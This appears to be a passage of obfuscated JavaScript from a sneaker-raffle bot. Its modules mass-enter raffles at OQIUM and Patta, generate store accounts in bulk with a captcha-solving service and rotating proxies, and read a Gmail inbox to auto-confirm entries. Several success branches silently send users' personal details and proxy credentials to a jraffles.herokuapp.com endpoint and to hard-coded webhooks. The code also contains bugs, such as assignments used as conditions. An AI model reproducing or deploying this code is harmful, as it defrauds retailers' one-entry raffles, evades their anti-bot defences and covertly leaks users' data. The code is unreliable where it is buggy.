                                    _0x4a58d4['data']['attributes']['properties']['$first_name'] = '' + _0x452421[_0x255822]['FirstName'], _0x4a58d4['data']['attributes']['properties']['$last_name'] = '' + _0x452421[_0x255822]['LastName'], _0x4a58d4['data']['attributes']['properties']['$address1'] = _0x452421[_0x255822]['Address1'] + '\x20' + _0x452421[_0x255822]['Address2'] + '\x20' + _0x452421[_0x255822]['HouseNumber'], _0x4a58d4['data']['attributes']['properties']['$zip'] = '' + _0x452421[_0x255822]['Zip'], _0x4a58d4['data']['attributes']['properties']['$city'] = '' + _0x452421[_0x255822]['City'], _0x4a58d4['data']['attributes']['properties']['$country'] = '' + _0x452421[_0x255822]['Country'], _0x452421[_0x255822]['Size'] == 'RANDOM' ? _0x4a58d4['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x124757[_0x2aa54b] : _0x4a58d4['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x452421[_0x255822]['Size'], _0x4a58d4['data']['attributes']['properties']['$phone_number'] = '' + _0x452421[_0x255822]['Phone'], _0x4a58d4['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x452421[_0x255822]['Follower'];
                                }
                                if (_0x138f58['useRandomProxy'] = ![])
                                    var _0x50a250 = _0x9cb6f3[_0x255822]['split'](':');
                                else
                                    var _0x33d045 = Math['round'](Math['random']() * (_0x9cb6f3['length'] - 0x1)), _0x50a250 = _0x9cb6f3[_0x33d045]['split'](':');
                                var _0x13f6ce = {
                                    'jar': _0x5ed650,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5ebd4f['url'],
                                    'headers': _0x5ebd4f['headers'],
                                    'body': JSON['stringify'](_0x4a58d4),
                                    'proxy': 'http://' + _0x50a250[0x2] + ':' + _0x50a250[0x3] + '@' + _0x50a250[0x0] + ':' + _0x50a250[0x1]
                                };
                                return _0x3b7c9d != 'ver' && (_0x13f6ce['url'] = _0x5ebd4f['url'], _0x13f6ce['headers'] = _0x5ebd4f['headers']), _0x3b7c9d == 'ver' && (_0x13f6ce['method'] = 'GET'), new Promise(function (_0x25eab7, _0x20901e) {
                                    callback = async (_0x37e9d6, _0x502928, _0x5ce64d) => {
                                        if (!_0x37e9d6 && _0x502928['statusCode'] == 0xca || !_0x37e9d6 && _0x502928['statusCode'] == 0xc8) {
                                            if (_0x3b7c9d != 'ver') {
                                                var _0x337b78 = await _0x232baa(_0x452421[_0x255822], _0x5ebd4f, 'dev', ![]), _0x348ba5 = await _0x232baa(_0x452421[_0x255822], _0x5ebd4f, 'pub', ![]);
                                                const _0x43a2d6 = {
                                                    'succesDEVMSG': { 'embeds': [_0x337b78] },
                                                    'succesPUBMSG': { 'embeds': [_0x348ba5] }
                                                };
                                                let _0xa14222 = _0x452421[_0x255822];
                                                try {
                                                    prxdata = {
                                                        'username': _0x9f5859['replace']('#', ''),
                                                        'module': _0x5ebd4f['name'],
                                                        'entrydata': JSON['stringify'](_0xa14222),
                                                        'proxy': '' + _0x9cb6f3[_0x255822]
                                                    };
                                                    var _0x3bbf1c = JSON['stringify'](prxdata);
                                                    let _0x4875ee = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x3bbf1c, _0x4875ee);
                                                } catch (_0x208016) {
                                                }
                                                if (_0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '')
                                                    try {
                                                        await _0x468b99(_0x138f58['webhook'], _0x43a2d6['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x43a2d6['succesDEVMSG']), await _0x497396(0xc8);
                                                try {
                                                    await _0x468b99(_0x196877, _0x43a2d6['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xf67db6(_0x452421[_0x255822], _0x5ebd4f);
                                            }
                                            _0x5ef014--, _0x25eab7(console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x5ebd4f['name'] + ']\x20Task\x20' + (_0x255822 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x3b7c9d != 'ver') {
                                                var _0xb8441e = '' + _0x37e9d6, _0x49cc19 = await _0x232baa(_0x452421[_0x255822], _0x5ebd4f, 'dev', !![], _0xb8441e), _0xce6b6c = {};
                                                _0xce6b6c['errorDEV'] = { 'embeds': [_0x49cc19] }, _0x554010(_0x452421[_0x255822], _0x5ebd4f), _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0xce6b6c['errorDEV']), await _0x468b99(_0x432bcc, _0xce6b6c['errorDEV']);
                                            }
                                            _0x5ef014--, _0x20901e(console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x5ebd4f['name'] + ']\x20Task\x20' + (_0x255822 + 0x1) + ':\x20' + _0x37e9d6)));
                                        }
                                    };
                                    try {
                                        _0x3b7c9d != 'ver' && console['log'](_0x5d34e1() + '\x20[' + _0x5ebd4f['name'] + ']\x20Task\x20' + (_0x255822 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4a58d4['data']['attributes']['email']), _0x158f3c(_0x13f6ce, callback);
                                    } catch (_0x1a4805) {
                                        console['log'](_0x5d34e1() + '\x20Task\x20' + (_0x255822 + 0x1) + ':\x20' + _0x1a4805);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x11b14e(_0x10af94, 'nor', _0x26f0d0, _0x541083, _0xb94695), console['log'](_0x5d34e1() + '\x20[' + _0x26f0d0['name'] + ']\x20Sleeping\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                            } catch (_0x3a33e9) {
                            }
                        }
                        _0x2b3dfb(_0x1c2e9d, _0x5d0749, _0x4e21fc, _0x2182a5), await _0x497396(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x46262c, _0x4c8438, _0x5560d8) {
                    var _0x4c8438 = [], _0x4ea5bc = ![];
                    async function _0x5b2f90() {
                        var _0x1a0a8f = new _0x51270e({
                            'user': _0x138f58['masterMail'],
                            'password': _0x138f58['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1b8044(_0x125320) {
                            _0x1a0a8f['openBox']('INBOX', ![], _0x125320);
                        }
                        _0x1a0a8f['once']('ready', function () {
                            _0x1b8044(function (_0x9335e8, _0x682bda) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x9335e8)
                                    throw _0x9335e8;
                                _0x1a0a8f['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x550bfb, _0x41af17) {
                                    if (!_0x41af17 || !_0x41af17['length'])
                                        console['log'](_0x5d34e1() + '\x20[' + _0x46262c['name'] + ']\x20No\x20mails\x20found'), _0x1a0a8f['end']();
                                    else {
                                        var _0x23255b = _0x1a0a8f['seq']['fetch'](_0x41af17, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x23255b['on']('message', function (_0x186dda, _0x4d18db) {
                                            var _0x100efc = '(#' + _0x4d18db + ')\x20';
                                            _0x186dda['on']('body', function (_0x39dbe0, _0x2c40eb) {
                                                _0x3bc712(_0x39dbe0, (_0x5b4003, _0x468605) => {
                                                    var _0x3721b6 = _0x468605['text']['split']('(')[0x1], _0x5493d0 = _0x3721b6['split'](')')[0x0];
                                                    _0x4c8438['push'](_0x5493d0);
                                                });
                                            }), _0x186dda['once']('end', function () {
                                            });
                                        }), _0x23255b['once']('error', function (_0x2e507d) {
                                            console['log']('Fetch\x20error:\x20' + _0x2e507d), _0x4ea5bc = !![];
                                        }), _0x23255b['once']('end', function () {
                                            _0x1a0a8f['end'](), _0x4ea5bc = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x1a0a8f['once']('error', function (_0x5de52c) {
                            console['log'](_0x5de52c), _0x4ea5bc = !![];
                        }), _0x1a0a8f['once']('end', async function () {
                            _0x4ea5bc = !![];
                        }), _0x1a0a8f['connect']();
                    }
                    async function _0x2cefc2(_0x16b621, _0x38decc, _0x44789a) {
                        for (var _0x3940b8 = 0x0; _0x3940b8 < _0x38decc['length']; _0x3940b8++) {
                            async function _0x381596(_0x3c3138, _0x3de6ef, _0x225db0, _0x25244b, _0x405c11) {
                                var _0x45ec19, _0x3be405 = {}, _0x232ec5 = [], _0x56c6cf = {}, _0x45d343 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2fae69 = Math['round'](Math['random']() * (_0x45d343['length'] - 0x1));
                                _0x25244b[_0x3c3138]['Size'] == 'RANDOM' && (_0x25244b[_0x3c3138]['Size'] = _0x45d343[_0x2fae69]);
                                !_0x25244b && (_0x25244b = {});
                                if (_0x138f58['useRandomProxy'] = ![])
                                    var _0x26bd8c = _0x405c11[_0x3c3138]['split'](':');
                                else
                                    var _0x4c87c9 = Math['round'](Math['random']() * (_0x405c11['length'] - 0x1)), _0x26bd8c = _0x405c11[_0x4c87c9]['split'](':');
                                var _0x480742 = {
                                    'jar': _0x5ed650,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x225db0['url'],
                                    'headers': _0x225db0['headers'],
                                    'body': JSON['stringify'](_0x3be405),
                                    'proxy': 'http://' + _0x26bd8c[0x2] + ':' + _0x26bd8c[0x3] + '@' + _0x26bd8c[0x0] + ':' + _0x26bd8c[0x1]
                                };
                                return _0x3de6ef == 'ver' && (_0x480742['method'] = 'GET', _0x480742['url'] = _0x25244b[_0x3c3138]), new Promise(function (_0x1b773e, _0x1353e0) {
                                    callback = async (_0x33d585, _0x16f79f, _0x21786f) => {
                                        !_0x33d585 && _0x16f79f['statusCode'] == 0xca || !_0x33d585 && _0x16f79f['statusCode'] == 0xc8 ? _0x1b773e(console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x225db0['name'] + ']\x20Task\x20' + (_0x3c3138 + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x1353e0(console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x225db0['name'] + ']\x20Task\x20' + (_0x3c3138 + 0x1) + ':\x20' + _0x33d585)));
                                    };
                                    try {
                                        _0x3de6ef != 'ver' ? console['log'](_0x5d34e1() + '\x20[' + _0x225db0['name'] + ']\x20Task\x20' + (_0x3c3138 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3be405['data']['attributes']['email']) : console['log'](_0x5d34e1() + '\x20[' + _0x225db0['name'] + ']\x20Task\x20' + (_0x3c3138 + 0x1) + ':\x20Fetching\x20Response'), _0x158f3c(_0x480742, callback);
                                    } catch (_0x41e710) {
                                        console['log'](_0x5d34e1() + '\x20Task\x20' + (_0x3c3138 + 0x1) + ':\x20' + _0x41e710);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x381596(_0x3940b8, 'ver', _0x16b621, _0x38decc, _0x44789a), console['log'](_0x5d34e1() + '\x20[' + _0x16b621['name'] + ']\x20Sleeping\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                            } catch (_0x55cb9b) {
                                console['log'](_0x55cb9b), await _0x497396(0x2710);
                            }
                        }
                    }
                    try {
                        _0x5b2f90();
                        while (!_0x4ea5bc) {
                            await _0x497396(0xfa0);
                        }
                        console['log']('Found\x20' + _0x4c8438['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x8954e8) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x8954e8), await _0x497396(0x2710);
                    }
                    try {
                        await _0x2cefc2(_0x46262c, _0x4c8438, _0x5560d8);
                    } catch (_0x852b3d) {
                        console['log'](_0x852b3d), await _0x497396(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x43a0a7, _0x55d47d, _0xe7077f) {
                    _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x138f58['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1f3d1c = 0x0; _0x1f3d1c < _0x55d47d['length']; _0x1f3d1c++) {
                        var _0x5c290b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x9f5859
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x138f58['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x30d211
                                }
                            ]
                        }];
                        const _0x22608a = { 'embeds': _0x5c290b };
                        _0x38ef83(_0x43a0a7['name'] + '\x20Task\x20' + (_0x1f3d1c + 0x1) + '\x20/\x20' + _0x55d47d['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                        try {
                            await _0x494c97(_0x55d47d, _0x1f3d1c);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x930e01 = await _0x232baa(_0x55d47d[_0x1f3d1c], _0x43a0a7, 'acc', ![]);
                        const _0x1425af = { 'succesDEVMSG': { 'embeds': [_0x930e01] } };
                        if (_0x55d47d[_0x1f3d1c]['Email'] == '' || _0x55d47d[_0x1f3d1c]['FirstName'] == '' || _0x55d47d[_0x1f3d1c]['LastName'] == '') {
                            console['log'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x1f3d1c + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x497396(0x7d0);
                            continue;
                        }
                        (_0x55d47d[_0x1f3d1c]['Password'] == '' || _0x55d47d[_0x1f3d1c] == undefined) && _0x55d47d[_0x1f3d1c]['Password'] == 'JRaffles23!';
                        if (_0x138f58['useRandomProxy'] = ![])
                            var _0x2909d8 = _0xe7077f[_0x1f3d1c]['split'](':');
                        else
                            var _0x4657c8 = Math['round'](Math['random']() * (_0xe7077f['length'] - 0x1)), _0x2909d8 = _0xe7077f[_0x4657c8]['split'](':');
                        var _0x4085bd;
                        try {
                            _0x4085bd = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2909d8[0x0] + ':' + _0x2909d8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4085bd = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2909d8[0x0] + ':' + _0x2909d8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x407387 = await _0x4085bd['newPage']();
                            await _0x407387['authenticate']({
                                'username': '' + _0x2909d8[0x2],
                                'password': '' + _0x2909d8[0x3]
                            }), console['log'](_0x5d34e1() + '\x20[' + _0x43a0a7['name'] + ']\x20Task\x20' + (_0x1f3d1c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x407387['setRequestInterception'](!![]), _0x407387['on']('request', _0x2e4a08 => {
                                _0x2e4a08['resourceType']() === 'image' || _0x2e4a08['resourceType']() === 'font' || _0x2e4a08['resourceType']() === 'media' ? _0x2e4a08['abort']() : _0x2e4a08['continue']();
                            }), await _0x407387['goto']('https://patta.nl/account/register'), await _0x497396(0xbb8), await _0x407387['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x5d34e1() + '\x20[' + _0x43a0a7['name'] + ']\x20Task\x20' + (_0x1f3d1c + 0x1) + '\x20:\x20Filling\x20information'), await _0x407387['type']('#RegisterForm-FirstName', '' + _0x55d47d[_0x1f3d1c]['FirstName']), await _0x497396(0x226), await _0x407387['type']('#RegisterForm-LastName', '' + _0x55d47d[_0x1f3d1c]['LastName']), await _0x497396(0x226), await _0x407387['type']('#RegisterForm-email', '' + _0x55d47d[_0x1f3d1c]['Email']), await _0x497396(0x226), await _0x407387['type']('#RegisterForm-password', '' + _0x55d47d[_0x1f3d1c]['Password']), await _0x497396(0x226), console['log'](_0x5d34e1() + '\x20[' + _0x43a0a7['name'] + ']\x20Task\x20' + (_0x1f3d1c + 0x1) + '\x20:\x20Submitting..'), await _0x407387['$eval']('#RegisterForm', _0x20f30e => _0x20f30e['submit']()), await _0x497396(0x1f40);
                            try {
                                await _0x407387['waitForSelector']('.home-page-grid__collection'), await _0x497396(0x1f4), console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x43a0a7['name'] + ']\x20Task\x20' + (_0x1f3d1c + 0x1) + '\x20:\x20Account\x20' + _0x55d47d[_0x1f3d1c]['Email'] + '\x20Generated!')), _0x44f9d7['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x55d47d[_0x1f3d1c]['Email'] + ',' + _0x55d47d[_0x1f3d1c]['Password']), console['log'](_0xc3fc3['yellow'](_0x5d34e1() + '\x20[' + _0x43a0a7['name'] + ']\x20Task\x20' + (_0x1f3d1c + 0x1) + '\x20:\x20Account\x20' + _0x55d47d[_0x1f3d1c]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x1425af['succesDEVMSG']);
                                } catch {
                                }
                                await _0x468b99(_0x1e3801, _0x1425af['succesDEVMSG']);
                            } catch (_0x523e4d) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x1f3d1c + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x523e4d));
                            }
                        } catch (_0x2dfbcf) {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x1f3d1c + 0x1) + '\x20:\x20' + _0x2dfbcf));
                        } finally {
                            _0x4085bd && _0x4085bd['close'](), console['log']('Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x144dbf, _0x4a8507, _0x59857b) {
                    _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x138f58['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3f73ec = 0x0; _0x3f73ec < _0x4a8507['length']; _0x3f73ec++) {
                        var _0x68e328;
                        if (_0x14b270 != 'yes')
                            var _0x14b270 = '', _0x69742a = 0x0;
                        _0x38ef83(_0x144dbf['name'] + '\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20/\x20' + _0x4a8507['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                        try {
                            await _0x494c97(_0x4a8507, _0x3f73ec);
                        } catch {
                            _0x14b270 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x4a8507[_0x3f73ec]['Email'] == '' || _0x4a8507[_0x3f73ec]['Password'] == '' || _0x4a8507[_0x3f73ec]['FirstName'] == '' || _0x4a8507[_0x3f73ec]['LastName'] == '') {
                            console['log'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x138f58['useRandomProxy'] = ![])
                            var _0x5d2281 = _0x59857b[_0x3f73ec]['split'](':');
                        else
                            var _0x1e7846 = Math['round'](Math['random']() * (_0x59857b['length'] - 0x1)), _0x5d2281 = _0x59857b[_0x1e7846]['split'](':');
                        var _0x440ae7;
                        try {
                            _0x440ae7 = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5d2281[0x0] + ':' + _0x5d2281[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x440ae7 = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5d2281[0x0] + ':' + _0x5d2281[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2e000c = await _0x440ae7['newPage']();
                            await _0x2e000c['authenticate']({
                                'username': '' + _0x5d2281[0x2],
                                'password': '' + _0x5d2281[0x3]
                            }), console['log'](_0x5d34e1() + '\x20[' + _0x144dbf['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2e000c['setRequestInterception'](!![]), _0x2e000c['on']('request', _0xb0b53 => {
                                _0xb0b53['resourceType']() === 'image' || _0xb0b53['resourceType']() === 'font' || _0xb0b53['resourceType']() === 'media' ? _0xb0b53['abort']() : _0xb0b53['continue']();
                            }), await _0x2e000c['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2e000c['waitForSelector']('#CustomerEmail'), console['log'](_0x5d34e1() + '\x20[' + _0x144dbf['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2e000c['type']('#CustomerEmail', '' + _0x4a8507[_0x3f73ec]['Email']), await _0x497396(0x12c), await _0x2e000c['type']('#CustomerPassword', '' + _0x4a8507[_0x3f73ec]['Password']), await _0x497396(0x226), await _0x2e000c['$eval']('#customer_login', _0x4044c9 => _0x4044c9['submit']());
                            try {
                                await _0x2e000c['waitForSelector']('#orders'), await _0x497396(0x4b0);
                            } catch {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x144dbf['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x2e000c['goto']('' + _0x4a8507[_0x3f73ec]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x497396(0xbb8), console['log'](_0x5d34e1() + '\x20[' + _0x144dbf['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x2e000c['waitForSelector']('#email');
                            } catch {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x144dbf['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x2e000c['type']('#email', '' + _0x4a8507[_0x3f73ec]['Email']), await _0x497396(0x384), await _0x2e000c['type']('#first_name', '' + _0x4a8507[_0x3f73ec]['FirstName']), await _0x497396(0x514), await _0x2e000c['type']('#last_name', '' + _0x4a8507[_0x3f73ec]['LastName']), await _0x497396(0x514), await _0x2e000c['type']('#street_address', _0x4a8507[_0x3f73ec]['Address1'] + '\x20' + _0x4a8507[_0x3f73ec]['HouseNumber'] + '\x20' + _0x4a8507[_0x3f73ec]['Address2']), await _0x497396(0x2bc);
                            _0x4a8507[_0x3f73ec]['Postcode'] == undefined && (_0x4a8507[_0x3f73ec]['Postcode'] = _0x4a8507[_0x3f73ec]['Zip']);
                            await _0x2e000c['type']('#zip_code', '' + _0x4a8507[_0x3f73ec]['Postcode']), await _0x497396(0x320), await _0x2e000c['type']('#city', '' + _0x4a8507[_0x3f73ec]['City']), await _0x497396(0x320), await _0x2e000c['type']('#bday', '01/01/1994'), await _0x497396(0x320), await _0x2e000c['type']('#instagram', '' + _0x4a8507[_0x3f73ec]['Follower']), await _0x497396(0x352);
                            if (_0x4a8507[_0x3f73ec]['Size'] == 'RANDOM') {
                                const _0x4c1013 = await _0x2e000c['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x2da413 => {
                                    return _0x2da413['map'](_0x45fb43 => _0x45fb43['textContent']);
                                });
                                var _0x33d235 = Math['round'](Math['random']() * (_0x4c1013['length'] - 0x1));
                                console['log'](_0x5d34e1() + '\x20[' + _0x144dbf['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x4c1013[_0x33d235]), await _0x2e000c['click']('label[data-eu-size=\x22' + _0x4c1013[_0x33d235] + '\x22]');
                            } else {
                                console['log'](_0x5d34e1() + '\x20[' + _0x144dbf['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x4a8507[_0x3f73ec]['Size']);
                                try {
                                    await _0x2e000c['click']('label[data-eu-size=\x22' + _0x4a8507[_0x3f73ec]['Size'] + '\x22]');
                                } catch {
                                    await _0x2e000c['click']('label[data-eu-size=\x22' + _0x4a8507[_0x3f73ec]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x497396(0xbb8), await _0x2e000c['$$eval']('.raffle__checkbox-label', _0x3ae502 => _0x3ae502['forEach'](_0x37e89c => _0x37e89c['click']())), await _0x497396(0x7d0), console['log'](_0x5d34e1() + '\x20[' + _0x144dbf['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x2e000c['click']('#raffle__form-submit'), await _0x497396(0x1388);
                            try {
                                await _0x2e000c['waitForSelector']('#raffle__confirmation-message-container'), _0x14b270 = 'no', _0xf67db6(_0x4a8507[_0x3f73ec], _0x144dbf), console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x144dbf['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x3dc37c = _0x4a8507[_0x3f73ec];
                                try {
                                    prxdata = {
                                        'username': _0x9f5859['replace']('#', ''),
                                        'module': _0x144dbf['name'],
                                        'entrydata': JSON['stringify'](_0x3dc37c),
                                        'proxy': '' + _0x59857b[_0x3f73ec]
                                    };
                                    var _0x1b0932 = JSON['stringify'](prxdata);
                                    let _0x57bd46 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x1b0932, _0x57bd46);
                                } catch (_0x52db72) {
                                }
                            } catch (_0x3aea05) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x3aea05));
                            }
                        } catch (_0x554207) {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x3e5733[taskModule]['name'] + ']\x20Task\x20' + (_0x3f73ec + 0x1) + '\x20:\x20' + _0x554207)), _0x14b270 = 'yes';
                        } finally {
